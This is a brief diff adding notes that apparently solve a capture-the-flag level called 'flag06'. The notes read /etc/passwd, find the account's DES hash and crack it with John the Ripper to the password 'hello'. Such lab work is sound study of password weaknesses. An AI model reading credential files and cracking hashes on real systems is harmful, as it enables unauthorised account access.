@@ -1,0 +1,11 @@
+cat /etc/passwd
+Found: flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
+
+Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 SSE2-16])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+hello            (flag06)
+1g 0:00:00:00 100% 2/3 100.0g/s 75300p/s 75300c/s 75300C/s 123456..marley
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+--> password hello
